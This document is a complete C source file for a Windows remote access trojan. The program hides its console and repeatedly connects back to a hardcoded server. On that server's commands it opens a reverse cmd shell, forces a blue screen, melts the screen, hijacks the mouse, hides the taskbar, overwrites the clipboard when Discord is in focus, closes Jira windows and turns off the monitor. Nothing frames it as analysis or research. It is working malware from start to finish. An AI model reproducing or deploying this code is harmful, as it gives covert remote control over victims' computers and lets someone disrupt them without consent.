#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Wingdi.h>

#define def_WindowName "ScreenMelter"
//# define SERVER_IP (char*)"127.0.0.1"
# define SERVER_IP (char*) "192.168.111.106"
# define SERVER_PORT (int)55555

typedef NTSTATUS(NTAPI *TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

typedef NTSTATUS(NTAPI *TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
        ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);

int getMouse(void);
void jiraTrap(void);
void discordWatchdog(void);

int ScreenWidth, ScreenHeight;
int Interval = 100;
LPPOINT point;
int VOLUME_MUTE = 0x80000;
int VOLUME_DOWN = 0x90000;
int VOLUME_UP = 0xA0000;

int tryToConnect(char *L_IP, int *L_PORT)
{
    int recv_size;
    char server_reply[2048];
    char shell_command[1024];
    char PC_name[256];
    char psBuffer[128];
    char Welcome_msg[256] = "Polaczono z ";
    int wmSize = 12;
    DWORD nmSize = 255;
    int x;
    int newPort;
    FILE *pPipe;
    HANDLE hMouseThread;
    HANDLE hTrapThread;
    HANDLE hDiscordThread;

    WSADATA wsaData;

    x = GetComputerName(PC_name, &nmSize);
    if(!x)
    {
        printf("Cos poszlo nie tak:\n\n");
        ShowErrors();
    }
    strcat(Welcome_msg, PC_name);
    strcat(Welcome_msg, " VER: 0.9\n");

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
    {
        write(2, "[ERROR] WSASturtup failed.\n", 27);
        WSACleanup();
        return (-1);
    }

    struct sockaddr_in sa;
    SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    sa.sin_family = AF_INET;
    sa.sin_port = htons(SERVER_PORT);
    sa.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0)
    {
        write(2, "[ERROR] connect failed.\n", 24);
        WSACleanup();
        return (-2);
    }
    wmSize = calcLength(Welcome_msg);
    if((send(sockt, Welcome_msg, wmSize, 0)) == SOCKET_ERROR)
    {
        puts("Sending error, breaking loop!");
    }
    while(1)
    {
        if((recv_size = recv(sockt, server_reply, 2000, 0)) == SOCKET_ERROR)
        {
            puts("Recv failed, breaking loop!");
            break;
        }
        else
        {
            server_reply[recv_size] = '\0';
            if (strncmp(server_reply,"closeit",7) == 0)
            {
                printf("Closing connection...\n");
                break;
            }
            else if (strncmp(server_reply,"shell",5) == 0)
            {
                if((send(sockt, "Opening shell...\n", 17, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                puts("Creating Shell\n");
                createShell();
            }
            else if (strncmp(server_reply,"bsod",4) == 0)
            {
                if((send(sockt, "Starting BSOD...\n", 17, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                puts("Activating BSOD\n");
                BSOD();
            }
            else if (strncmp(server_reply,"meltscreen",10) == 0)
            {
                if((send(sockt, "Starting Screen Melter...\n", 26, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                int k;
                puts("Melting screen\n");
                k = screenMelterFunc();
                if (k != 0)
                {
                    ShowErrors();
                }
            }
            else if (strncmp(server_reply,"getmouse",8) == 0)
            {
                if((send(sockt, "Taking Over mouse...\n", 21, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                puts("Creating mouse trap\n");
                hMouseThread = CreateThread(NULL, 0, getMouse, NULL, 0, NULL);
                if (hMouseThread == NULL)
                {
                    printf(stderr, "Creating the second thread failed.\n");
                }
            }
            else if (strncmp(server_reply,"givemouseback",13) == 0)
            {
                if((send(sockt, "Giving mouse back...\n", 21, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                int k;
                k = TerminateThread(hMouseThread,0x0);
            }
            else if (strncmp(server_reply,"volup",5) == 0)
            {
                if((send(sockt, "OK...\n", 5, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                volumeControll(VOLUME_UP);
            }
            else if (strncmp(server_reply,"voldw",5) == 0)
            {
                if((send(sockt, "OK...\n", 5, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                volumeControll(VOLUME_DOWN);
            }
            else if (strncmp(server_reply,"mute",4) == 0)
            {
                if((send(sockt, "OK...\n", 5, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                volumeControll(VOLUME_MUTE);
            }
            else if (strncmp(server_reply,"jiratrap",8) == 0)
            {
                if((send(sockt, "Turning on Jiratrap...\n", 23, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                puts("Creating Jira trap\n");
                hTrapThread = CreateThread(NULL, 0, jiraTrap, NULL, 0, NULL);
                if (hTrapThread == NULL)
                {
                    printf(stderr, "Creating the second thread failed.\n");
                }
            }
            else if (strncmp(server_reply,"givejiraback",12) == 0)
            {
                if((send(sockt, "Turning off Jiratrap...\n", 24, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                int k;
                k = TerminateThread(hTrapThread,0x0);
            }
            else if (strncmp(server_reply,"getmenustart",12) == 0)
            {
                if((send(sockt, "Turning off menu start...\n", 26, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                puts("Stealing menu start\n");
                ShowWindow(FindWindow( "Shell_TrayWnd",NULL), SW_HIDE);
            }
            else if (strncmp(server_reply,"givebackstart",13) == 0)
            {
                if((send(sockt, "Turning on menu start...\n", 25, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                ShowWindow(FindWindow( "Shell_TrayWnd",NULL), SW_SHOW);
            }
            else if (strncmp(server_reply,"discordtrapon",13) == 0)
            {
                if((send(sockt, "Turning on clippboard trap...\n", 30, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                puts("Creating Discord trap\n");
                hDiscordThread = CreateThread(NULL, 0, discordWatchdog, NULL, 0, NULL);
                if (hDiscordThread == NULL)
                {
                    printf(stderr, "Creating the second thread failed.\n");
                }
            }
            else if (strncmp(server_reply,"discordtrapoff",14) == 0)
            {
                if((send(sockt, "Turning off clippboard trap...\n", 31, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                int k;
                k = TerminateThread(hDiscordThread,0x0);
            }
            else if (strncmp(server_reply,"turnoffmonitor",14) == 0)
            {
                if((send(sockt, "Turning off Monitor...\n", 23, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                puts("Turning off monitor\n");
                SendMessage(HWND_BROADCAST,WM_SYSCOMMAND,SC_MONITORPOWER,(LPARAM)2);
            }
            else if (strncmp(server_reply,"generateerror",13) == 0)
            {
                if((send(sockt, "Displaying error\n", 17, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                puts("Generating error\n");
                GenerateError(server_reply);
            }
            else if (strncmp(server_reply,"swapmousebuttons",16) == 0)
            {
                if((send(sockt, "Mouse key swapped\n", 18, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                puts("Swaping mouse\n");
                SwapMouseButton(1);
            }
            else if (strncmp(server_reply,"swapmouseback",13) == 0)
            {
                if((send(sockt, "Mouse key swapped back\n", 23, 0)) == SOCKET_ERROR)
                {
                    puts("Sending error, breaking loop!");
                    break;
                }
                SwapMouseButton(0);
            }
            else
            {
                puts("Reply received:\n");
                puts(server_reply);
            }
        }
    }
    WSACleanup();
    return 1;
}
void GenerateError(char *stackedParams)
{
    char* params[5];
    int idx = 0;

    char delim[] = ",";
    char* ptr = strtok(stackedParams, delim);
    while(ptr != NULL)
    {
        params[idx] = ptr;
		ptr = strtok(NULL, delim);
		idx++;
    }
    if (idx == 4)
    {
        MessageBoxA(NULL,params[1],params[2],atoi(params[3]));
    }
    else
    {
        MessageBoxA(NULL,params[1],params[2],atoi(params[3])|atoi(params[4]));
    }
}

int createShell()
{
    int L_port = 1234;
    WSADATA wsaDataNew;
    if (WSAStartup(MAKEWORD(2,2), &wsaDataNew) != 0)
    {
        write(2, "[ERROR] WSASturtupNew failed.\n", 27);
        return (-1);
    }
    struct sockaddr_in saNew;
    SOCKET socktNew = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    saNew.sin_family = AF_INET;
    saNew.sin_port = htons(L_port);
    saNew.sin_addr.s_addr = inet_addr(SERVER_IP);
    if (connect(socktNew, (struct sockaddr *) &saNew, sizeof(saNew)) != 0)
    {
        write(2, "[ERROR] New Connect failed.\n", 28);
        return (-2);
    }
    STARTUPINFO sinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES);
    sinfo.hStdInput = (HANDLE)socktNew;
    sinfo.hStdOutput = (HANDLE)socktNew;
    sinfo.hStdError = (HANDLE)socktNew;
    PROCESS_INFORMATION pinfo;
    CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

    return (0);
}

int calcLength(char* L_char)
{
    int n = 0;
    while(L_char[n] != '\0')
    {
        n++;
    }
    return n;
}

void ShowErrors()
{
    char buf[1024];
    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), 0,
                  buf, sizeof(buf), NULL);
    printf("ERROR: %s", buf);
}

void BSOD()
{
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    if (hNtdll != 0)
    {
        NTSTATUS s1, s2;
        BOOLEAN b;
        ULONG r;
        TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = (TFNRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        s1 = pfnRtlAdjustPrivilege(19, 1, 0, &b);
        TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
        s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
    }
    return 0;
}

LRESULT CALLBACK Melter(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
    switch (Msg)
    {
    case WM_CREATE:
    {
        HDC Desktop = GetDC(HWND_DESKTOP);
        HDC Window = GetDC(hWnd);

        BitBlt(Window, 0, 0, ScreenWidth, ScreenHeight, Desktop, 0, 0, SRCCOPY);
        ReleaseDC(hWnd, Window);
        ReleaseDC(HWND_DESKTOP, Desktop);

        SetTimer(hWnd, 0, Interval, 0);
        ShowWindow(hWnd, SW_SHOW);
        break;
    }
    case WM_PAINT:
    {
        ValidateRect(hWnd, 0);
        break;
    }
    case WM_TIMER:
    {
        HDC Window = GetDC(hWnd);
        int X = (rand() % ScreenWidth) - (150 / 2),
            Y = (rand() % 15),
            Width = (rand() % 150);
        BitBlt(Window, X, Y, Width, ScreenHeight, Window, X, 0, SRCCOPY);
        ReleaseDC(hWnd, Window);
        break;
    }
    case WM_DESTROY:
    {
        KillTimer(hWnd, 0);
        PostQuitMessage(0);
        break;
    }
    return 0;
    }
    return DefWindowProc(hWnd, Msg, wParam, lParam);
}

int screenMelterFunc()
{
    HINSTANCE Inst;

    ScreenWidth = GetSystemMetrics(SM_CXSCREEN);
    ScreenHeight = GetSystemMetrics(SM_CYSCREEN);

    WNDCLASS wndClass;
    wndClass.style = NULL;
    wndClass.lpfnWndProc	= Melter;
    wndClass.cbClsExtra	= NULL;
    wndClass.cbWndExtra	= NULL;
    wndClass.hInstance	= Inst;
    wndClass.hIcon		= NULL;
    wndClass.hCursor	= LoadCursor(NULL,IDC_ARROW);
    wndClass.hbrBackground	= NULL;
    wndClass.lpszMenuName	= NULL;
    wndClass.lpszClassName	= def_WindowName;

    if (RegisterClass(&wndClass) != 0)
    {
        return -1;
    }
    HWND hWnd = CreateWindowExA(WS_EX_TOPMOST, "ScreenMelter", 0, WS_POPUP,
                                0, 0, ScreenWidth, ScreenHeight, HWND_DESKTOP, 0, Inst, 0);
    if (hWnd)
    {
        srand(GetTickCount());
        MSG Msg = { 0 };
        while (Msg.message != WM_QUIT)
        {
            if (PeekMessage(&Msg, 0, 0, 0, PM_REMOVE))
            {
                TranslateMessage(&Msg);
                DispatchMessage(&Msg);
            }
        }
    }
    return 0;
}

int mouse_move()
{
    INPUT input;
    input.type = INPUT_MOUSE;
    input.mi.mouseData = 0;
    input.mi.time = 0;
    input.mi.dx = 0;
    input.mi.dy = 0;
    input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_VIRTUALDESK | MOUSEEVENTF_ABSOLUTE;
    SendInput(1, &input, sizeof(input));
    return 0;
}

int getMouse()
{
    int x = GetCursorPos(&point);
    if (x == 0)
    {
        ShowErrors();
        return -1;
    }
    while(1)
    {
        //mouse_move();
        //For now that's even better
        for (int i=0; i<20;i++)
        {
                SetCursorPos(rand()%1080,rand()%1920);
        }
    }
    return 0;
}

void volumeControll(int vol)
{
    HANDLE HwndWindow;
    HwndWindow = GetForegroundWindow();
    SendMessage(HwndWindow, WM_APPCOMMAND, NULL, vol);
}

void jiraTrap()
{
    HANDLE hWnd;
    int n;
    int p = 0;
    INPUT inputs[4] = {};
    char str1[128];
    char str2[] = "Advanced Agile";
    while(1)
    {
        hWnd = GetForegroundWindow();
        GetWindowTextA(hWnd, str1, sizeof(str1));
        n = calcLength(str2);
        for (int i = 0; i < n; i++)
        {
            if (str1[i] == str2[i])
            {
                p++;
            }
        }
        if (p == n)
        {
            printf("Ladies and Gantelmen we got him!");
            ZeroMemory(inputs, sizeof(inputs));

            inputs[0].type = INPUT_KEYBOARD;
            inputs[0].ki.wVk = VK_CONTROL;

            inputs[1].type = INPUT_KEYBOARD;
            inputs[1].ki.wVk = 0x57;

            inputs[2].type = INPUT_KEYBOARD;
            inputs[2].ki.wVk = 0x57;
            inputs[3].ki.dwFlags = KEYEVENTF_KEYUP;

            inputs[3].type = INPUT_KEYBOARD;
            inputs[3].ki.wVk = VK_CONTROL;
            inputs[3].ki.dwFlags = KEYEVENTF_KEYUP;

            UINT uSent = SendInput(ARRAYSIZE(inputs), inputs, sizeof(INPUT));
        }
        p = 0;
        sleep(20);
    }
}

void discordWatchdog()
{
    HANDLE hWnd;
    char str1[128];
    char str2[] = "Discord";
    int n;
    int p = 0;
    while(1)
    {
        hWnd = GetForegroundWindow();
        GetWindowTextA(hWnd, str1, sizeof(str1));
        if (strstr(str1, str2) != NULL)
        {
            scrambleClipboard(p);
            while (strstr(str1, str2) != NULL)
            {
                hWnd = GetForegroundWindow();
                GetWindowTextA(hWnd, str1, sizeof(str1));
            }
            if(p < 3)
            {
                p++;
            }
        }
        sleep(1);
    }
}

void scrambleClipboard(int k)
{
    HGLOBAL MyHandle;
    LPTSTR  lptstrCopy;
    char str2[] = "Discord";
    const char * constArray[] =
    {
        "Co Ty chciales zrobic? xD",
        "Wracaj do pracy!",
        "Zostaw to juz!",
        "xDDD"
    };
    if (OpenClipboard(NULL)==0)
    {
        ShowErrors();
    }
    if (EmptyClipboard()==0)
    {
        ShowErrors();
    }
    MyHandle = GlobalAlloc(GMEM_MOVEABLE, calcLength(constArray[k])+1 * sizeof(TCHAR));
    if (MyHandle == NULL)
    {
        ShowErrors();
    }
    lptstrCopy = GlobalLock(MyHandle);
    memcpy(lptstrCopy, constArray[k], calcLength(constArray[k])+1 * sizeof(TCHAR));
    GlobalUnlock(MyHandle);
    if (SetClipboardData(CF_TEXT, MyHandle)==0)
    {
        ShowErrors();
    }
    CloseClipboard();
}


int main(void)
{
    int ret = 0;
    CreateMutex(NULL, TRUE, "2fd289ad5f6cdba596ba16bd3460406e");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        return -1;
    }
    else
    {
        HWND hwnd = GetConsoleWindow();
        ShowWindow(hwnd, 0);
        while(1)
        {
            ret = tryToConnect(SERVER_IP, SERVER_PORT);
            Sleep(1000);
            printf("Trying to reconnect...\n");
        }
        return (0);
    }
}

